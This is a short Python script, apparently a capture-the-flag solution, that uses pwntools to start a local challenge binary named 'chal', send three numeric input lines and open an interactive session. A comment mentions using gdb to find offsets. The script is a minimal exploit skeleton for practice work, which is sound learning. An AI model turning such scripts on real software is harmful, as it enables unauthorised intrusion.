from pwn import *


e = ELF("./chal")

def setup():
    return e.process()


p = setup()
# use gdb to find offsets
p.sendline("1 23")
p.sendline("3 22")
p.sendline("1 1")
p.interactive()